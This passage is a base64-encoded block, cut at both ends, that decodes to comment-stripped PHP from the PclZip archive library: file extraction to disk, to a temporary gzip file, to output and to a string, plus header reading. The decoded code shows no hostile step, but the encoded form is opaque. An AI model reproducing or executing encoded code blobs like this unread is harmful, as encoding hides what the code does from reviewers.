bGVuYW1lJ10gPSAkcF9wYXRoLiIvIi4kcF9lbnRyeVsnZmlsZW5hbWUnXTsNCiAgfQ0KICANCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTl0pKSB7DQogICAgJHZfaW5jbHVzaW9uDQogICAgPSBQY2xaaXBVdGlsUGF0aEluY2x1c2lvbigkcF9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9ESVJfUkVTVFJJQ1RJT05dLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10pOyANCiAgICBpZiAoJHZfaW5jbHVzaW9uID09IDApIHsNCg0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9ESVJFQ1RPUllfUkVTVFJJQ1RJT04sDQoJCSAgICAgICAgICAgICAgICAgICAgICJGaWxlbmFtZSAnIi4kcF9lbnRyeVsnZmlsZW5hbWUnXS4iJyBpcyAiDQoJCQkJCQkJIC4ib3V0c2lkZSBQQ0xaSVBfT1BUX0VYVFJBQ1RfRElSX1JFU1RSSUNUSU9OIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXShQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCiAgICANCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJhYm9ydGVkIjsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KDQogICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10gPSAkdl9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQogIH0NCg0KDQogIGlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogIGlmIChmaWxlX2V4aXN0cygkcF9lbnRyeVsnZmlsZW5hbWUnXSkpDQogIHsNCg0KICAgIGlmIChpc19kaXIoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImFscmVhZHlfYV9kaXJlY3RvcnkiOw0KICAgICAgDQogICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl09PT10cnVlKSkgew0KDQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9BTFJFQURZX0FfRElSRUNUT1JZLA0KCQkgICAgICAgICAgICAgICAgICAgICAiRmlsZW5hbWUgJyIuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uIicgaXMgIg0KCQkJCQkJCSAuImFscmVhZHkgdXNlZCBieSBhbiBleGlzdGluZyBkaXJlY3RvcnkiKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KCSAgICB9DQogICAgfQ0KICAgIGVsc2UgaWYgKCFpc193cml0ZWFibGUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIndyaXRlX3Byb3RlY3RlZCI7DQoNCiAgICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1JdKSkNCgkgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCwNCgkJICAgICAgICAgICAgICAgICAgICAgIkZpbGVuYW1lICciLiRwX2VudHJ5WydmaWxlbmFtZSddLiInIGV4aXN0cyAiDQoJCQkJCQkJIC4iYW5kIGlzIHdyaXRlIHByb3RlY3RlZCIpOw0KDQogICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQoJICAgIH0NCiAgICB9DQoNCiAgICBlbHNlIGlmIChmaWxlbXRpbWUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pID4gJHBfZW50cnlbJ210aW1lJ10pDQogICAgew0KICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVQTEFDRV9ORVdFUl0pKQ0KCSAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVJdPT09dHJ1ZSkpIHsNCiAgCSAgfQ0KCSAgICBlbHNlIHsNCiAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAibmV3ZXJfZXhpc3QiOw0KDQogICAgICAgICAgaWYgKCAgIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU1RPUF9PTl9FUlJPUl0pKQ0KCSAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsDQoJCSAgICAgICAgICAgICAiTmV3ZXIgdmVyc2lvbiBvZiAnIi4kcF9lbnRyeVsnZmlsZW5hbWUnXS4iJyBleGlzdHMgIg0KCQkJCSAgICAuImFuZCBvcHRpb24gUENMWklQX09QVF9SRVBMQUNFX05FV0VSIGlzIG5vdCBzZWxlY3RlZCIpOw0KDQogICAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KCSAgICAgIH0NCgkgICAgfQ0KICAgIH0NCiAgICBlbHNlIHsNCiAgICB9DQogIH0NCg0KICBlbHNlIHsNCiAgICBpZiAoKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkgfHwgKHN1YnN0cigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgLTEpID09ICcvJykpDQogICAgICAkdl9kaXJfdG9fY2hlY2sgPSAkcF9lbnRyeVsnZmlsZW5hbWUnXTsNCiAgICBlbHNlIGlmICghc3Ryc3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAiLyIpKQ0KICAgICAgJHZfZGlyX3RvX2NoZWNrID0gIiI7DQogICAgZWxzZQ0KICAgICAgJHZfZGlyX3RvX2NoZWNrID0gZGlybmFtZSgkcF9lbnRyeVsnZmlsZW5hbWUnXSk7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEaXJDaGVjaygkdl9kaXJfdG9fY2hlY2ssICgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApKSkgIT0gMSkgew0KDQogICAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJwYXRoX2NyZWF0aW9uX2ZhaWwiOw0KDQogICAgICAgICR2X3Jlc3VsdCA9IDE7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAnb2snKSB7DQoNCiAgICBpZiAoISgoJHBfZW50cnlbJ2V4dGVybmFsJ10mMHgwMDAwMDAxMCk9PTB4MDAwMDAwMTApKQ0KICAgIHsNCiAgICAgIGlmICgkcF9lbnRyeVsnY29tcHJlc3Npb24nXSA9PSAwKSB7DQoNCiAgICAgICAgaWYgKCgkdl9kZXN0X2ZpbGUgPSBAZm9wZW4oJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICd3YicpKSA9PSAwKQ0KICAgICAgICB7DQoNCiAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAid3JpdGVfZXJyb3IiOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQoNCiAgICAgICAgJHZfc2l6ZSA9ICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgICAgICAgew0KICAgICAgICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAgICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICAgICAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOyAgICAgICAgICAgIA0KICAgICAgICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICAgICAgICB9DQoNCiAgICAgICAgZmNsb3NlKCR2X2Rlc3RfZmlsZSk7DQoNCiAgICAgICAgdG91Y2goJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICRwX2VudHJ5WydtdGltZSddKTsNCiAgICAgICAgDQoNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICBpZiAoKCRwX2VudHJ5WydmbGFnJ10gJiAxKSA9PSAxKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OLCAnRmlsZSBcJycuJHBfZW50cnlbJ2ZpbGVuYW1lJ10uJ1wnIGlzIGVuY3J5cHRlZC4gRW5jcnlwdGVkIGZpbGVzIGFyZSBub3Qgc3VwcG9ydGVkLicpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCg0KICAgICAgICBpZiAoICghaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkZdKSkgDQogICAgICAgICAgICAmJiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PTl0pDQogICAgICAgICAgICAgICAgfHwgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSkNCiAgICAgICAgICAgICAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSA8PSAkcF9lbnRyeVsnc2l6ZSddKSkgKSApIHsNCiAgICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkV4dHJhY3RGaWxlVXNpbmdUZW1wRmlsZSgkcF9lbnRyeSwgJHBfb3B0aW9ucyk7DQogICAgICAgICAgaWYgKCR2X3Jlc3VsdCA8IFBDTFpJUF9FUlJfTk9fRVJST1IpIHsNCiAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBlbHNlIHsNCg0KICAgICAgICANCiAgICAgICAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgICAgICANCiAgICAgICAgICAkdl9maWxlX2NvbnRlbnQgPSBAZ3ppbmZsYXRlKCR2X2J1ZmZlcik7DQogICAgICAgICAgdW5zZXQoJHZfYnVmZmVyKTsNCiAgICAgICAgICBpZiAoJHZfZmlsZV9jb250ZW50ID09PSBGQUxTRSkgew0KDQogICAgICAgICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiZXJyb3IiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICANCiAgICAgICAgICBpZiAoKCR2X2Rlc3RfZmlsZSA9IEBmb3BlbigkcF9lbnRyeVsnZmlsZW5hbWUnXSwgJ3diJykpID09IDApIHsNCg0KICAgICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gIndyaXRlX2Vycm9yIjsNCg0KICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfZmlsZV9jb250ZW50LCAkcF9lbnRyeVsnc2l6ZSddKTsNCiAgICAgICAgICB1bnNldCgkdl9maWxlX2NvbnRlbnQpOw0KDQogICAgICAgICAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KICAgICAgICAgIA0KICAgICAgICB9DQoNCiAgICAgICAgQHRvdWNoKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9lbnRyeVsnbXRpbWUnXSk7DQogICAgICB9DQoNCiAgICAgIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfU0VUX0NITU9EXSkpIHsNCg0KICAgICAgICBAY2htb2QoJHBfZW50cnlbJ2ZpbGVuYW1lJ10sICRwX29wdGlvbnNbUENMWklQX09QVF9TRVRfQ0hNT0RdKTsNCiAgICAgIH0NCg0KICAgIH0NCiAgfQ0KDQoJaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAiYWJvcnRlZCIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJza2lwcGVkIjsNCgl9DQoNCiAgZWxzZWlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlVXNpbmdUZW1wRmlsZSgmJHBfZW50cnksICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgICAgIA0KICAkdl9nemlwX3RlbXBfbmFtZSA9IFBDTFpJUF9URU1QT1JBUllfRElSLnVuaXFpZCgncGNsemlwLScpLicuZ3onOw0KICBpZiAoKCR2X2Rlc3RfZmlsZSA9IEBmb3Blbigkdl9nemlwX3RlbXBfbmFtZSwgIndiIikpID09IDApIHsNCiAgICBmY2xvc2UoJHZfZmlsZSk7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGluIGJpbmFyeSB3cml0ZSBtb2RlJyk7DQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KDQogICR2X2JpbmFyeV9kYXRhID0gcGFjaygndmExYTFWYTFhMScsIDB4OGIxZiwgQ2hyKCRwX2VudHJ5Wydjb21wcmVzc2lvbiddKSwgQ2hyKDB4MDApLCB0aW1lKCksIENocigweDAwKSwgQ2hyKDMpKTsNCiAgQGZ3cml0ZSgkdl9kZXN0X2ZpbGUsICR2X2JpbmFyeV9kYXRhLCAxMCk7DQoNCiAgJHZfc2l6ZSA9ICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X2Rlc3RfZmlsZSwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBwYWNrKCdWVicsICRwX2VudHJ5WydjcmMnXSwgJHBfZW50cnlbJ3NpemUnXSk7DQogIEBmd3JpdGUoJHZfZGVzdF9maWxlLCAkdl9iaW5hcnlfZGF0YSwgOCk7DQoNCiAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KDQogIGlmICgoJHZfZGVzdF9maWxlID0gQGZvcGVuKCRwX2VudHJ5WydmaWxlbmFtZSddLCAnd2InKSkgPT0gMCkgew0KICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJ3cml0ZV9lcnJvciI7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICgoJHZfc3JjX2ZpbGUgPSBAZ3pvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAncmInKSkgPT0gMCkgew0KICAgIEBmY2xvc2UoJHZfZGVzdF9maWxlKTsNCiAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAicmVhZF9lcnJvciI7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl9nemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHJlYWQgbW9kZScpOw0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCg0KICAkdl9zaXplID0gJHBfZW50cnlbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZ3pyZWFkKCR2X3NyY19maWxlLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfZGVzdF9maWxlLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCiAgQGZjbG9zZSgkdl9kZXN0X2ZpbGUpOw0KICBAZ3pjbG9zZSgkdl9zcmNfZmlsZSk7DQoNCiAgQHVubGluaygkdl9nemlwX3RlbXBfbmFtZSk7DQogIA0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXh0cmFjdEZpbGVJbk91dHB1dCgmJHBfZW50cnksICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZEZpbGVIZWFkZXIoJHZfaGVhZGVyKSkgIT0gMSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KDQogIGlmICgkdGhpcy0+cHJpdkNoZWNrRmlsZUhlYWRlcnMoJHZfaGVhZGVyLCAkcF9lbnRyeSkgIT0gMSkgew0KICB9DQoNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1RdKFBDTFpJUF9DQl9QUkVfRVhUUkFDVCwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICBpZiAoJHZfcmVzdWx0ID09IDApIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJza2lwcGVkIjsNCiAgICAgICR2X3Jlc3VsdCA9IDE7DQogICAgfQ0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAiYWJvcnRlZCI7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCg0KICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gJHZfbG9jYWxfaGVhZGVyWydmaWxlbmFtZSddOw0KICB9DQoNCg0KICBpZiAoJHBfZW50cnlbJ3N0YXR1cyddID09ICdvaycpIHsNCg0KICAgIGlmICghKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkpIHsNCiAgICAgIGlmICgkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ10gPT0gJHBfZW50cnlbJ3NpemUnXSkgew0KDQogICAgICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkcF9lbnRyeVsnY29tcHJlc3NlZF9zaXplJ10pOw0KDQogICAgICAgIGVjaG8gJHZfYnVmZmVyOw0KICAgICAgICB1bnNldCgkdl9idWZmZXIpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQoNCiAgICAgICAgJHZfYnVmZmVyID0gQGZyZWFkKCR0aGlzLT56aXBfZmQsICRwX2VudHJ5Wydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgICAgIA0KICAgICAgICAkdl9maWxlX2NvbnRlbnQgPSBnemluZmxhdGUoJHZfYnVmZmVyKTsNCiAgICAgICAgdW5zZXQoJHZfYnVmZmVyKTsNCg0KICAgICAgICBlY2hvICR2X2ZpbGVfY29udGVudDsNCiAgICAgICAgdW5zZXQoJHZfZmlsZV9jb250ZW50KTsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KaWYgKCRwX2VudHJ5WydzdGF0dXMnXSA9PSAiYWJvcnRlZCIpIHsNCiAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQp9DQoNCiAgZWxzZWlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKSkgew0KDQogICAgJHZfbG9jYWxfaGVhZGVyID0gYXJyYXkoKTsNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfZW50cnksICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0VYVFJBQ1RdKFBDTFpJUF9DQl9QT1NUX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkV4dHJhY3RGaWxlQXNTdHJpbmcoJiRwX2VudHJ5LCAmJHBfc3RyaW5nLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfaGVhZGVyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCg0KICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2hlYWRlciwgJHBfZW50cnkpICE9IDEpIHsNCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfRVhUUkFDVF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9lbnRyeSwgJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICR2X3Jlc3VsdCA9ICRwX29wdGlvbnNbUENMWklQX0NCX1BSRV9FWFRSQUNUXShQQ0xaSVBfQ0JfUFJFX0VYVFJBQ1QsICR2X2xvY2FsX2hlYWRlcik7DQogICAgaWYgKCR2X3Jlc3VsdCA9PSAwKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCiAgICANCiAgICBpZiAoJHZfcmVzdWx0ID09IDIpIHsNCiAgICAgICRwX2VudHJ5WydzdGF0dXMnXSA9ICJhYm9ydGVkIjsNCiAgICAJJHZfcmVzdWx0ID0gUENMWklQX0VSUl9VU0VSX0FCT1JURUQ7DQogICAgfQ0KDQogICAgJHBfZW50cnlbJ2ZpbGVuYW1lJ10gPSAkdl9sb2NhbF9oZWFkZXJbJ2ZpbGVuYW1lJ107DQogIH0NCg0KDQogIGlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogICAgaWYgKCEoKCRwX2VudHJ5WydleHRlcm5hbCddJjB4MDAwMDAwMTApPT0weDAwMDAwMDEwKSkgew0KICAgICAgaWYgKCRwX2VudHJ5Wydjb21wcmVzc2lvbiddID09IDApIHsNCg0KICAgICAgICAkcF9zdHJpbmcgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KDQogICAgICAgICR2X2RhdGEgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHBfZW50cnlbJ2NvbXByZXNzZWRfc2l6ZSddKTsNCiAgICAgICAgDQogICAgICAgIGlmICgoJHBfc3RyaW5nID0gQGd6aW5mbGF0ZSgkdl9kYXRhKSkgPT09IEZBTFNFKSB7DQogICAgICAgIH0NCiAgICAgIH0NCg0KICAgIH0NCiAgICBlbHNlIHsNCiAgICB9DQogICAgDQogIH0NCg0KCWlmICgkcF9lbnRyeVsnc3RhdHVzJ10gPT0gImFib3J0ZWQiKSB7DQogICAgICAkcF9lbnRyeVsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQoJfQ0KDQogIGVsc2VpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXSkpIHsNCg0KICAgICR2X2xvY2FsX2hlYWRlciA9IGFycmF5KCk7DQogICAgJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCRwX2VudHJ5LCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIA0KICAgICR2X2xvY2FsX2hlYWRlclsnY29udGVudCddID0gJHBfc3RyaW5nOw0KICAgICRwX3N0cmluZyA9ICcnOw0KDQogICAgJHZfcmVzdWx0ID0gJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNUXShQQ0xaSVBfQ0JfUE9TVF9FWFRSQUNULCAkdl9sb2NhbF9oZWFkZXIpOw0KDQogICAgJHBfc3RyaW5nID0gJHZfbG9jYWxfaGVhZGVyWydjb250ZW50J107DQogICAgdW5zZXQoJHZfbG9jYWxfaGVhZGVyWydjb250ZW50J10pOw0KDQogICAgaWYgKCR2X3Jlc3VsdCA9PSAyKSB7DQogICAgCSR2X3Jlc3VsdCA9IFBDTFpJUF9FUlJfVVNFUl9BQk9SVEVEOw0KICAgIH0NCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZSZWFkRmlsZUhlYWRlcigmJHBfaGVhZGVyKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdl9iaW5hcnlfZGF0YSA9IEBmcmVhZCgkdGhpcy0+emlwX2ZkLCA0KTsNCiAgJHZfZGF0YSA9IHVucGFjaygnVmlkJywgJHZfYmluYXJ5X2RhdGEpOw0KDQogIGlmICgkdl9kYXRhWydpZCddICE9IDB4MDQwMzRiNTApDQogIHsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfQ